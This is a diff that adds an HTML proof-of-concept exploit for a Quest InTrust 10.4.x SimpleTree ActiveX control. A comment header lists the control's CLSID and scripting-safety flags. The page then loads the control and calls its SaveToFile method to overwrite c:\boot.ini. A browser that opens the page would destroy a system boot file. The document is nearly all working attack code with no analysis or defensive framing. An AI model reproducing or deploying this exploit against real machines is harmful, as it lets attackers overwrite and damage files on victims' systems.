@@ -1,0 +1,17 @@
+<!--
+Quest InTrust 10.4.x SimpleTree Class ActiveX Control Remote File Overwrite
+
+binary path: C:\Program Files\Common Files\Aelita Shared\ARDoc.dll
+CLSID: {EB5920E8-F6FA-4080-ADDC-AA03FA23E2AB}
+ProgID: ARDOC.SimpleTree.1
+Implements IObjectSafety: yes
+Safe For Scripting (IObjectSafety): True
+Safe For Initialization (IObjectSafety): ?
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<object classid='clsid:EB5920E8-F6FA-4080-ADDC-AA03FA23E2AB' id='obj' WIDTH=640 height=480 />
+</object>
+<script>
+obj.SaveToFile("c:\\boot.ini");
+</script>
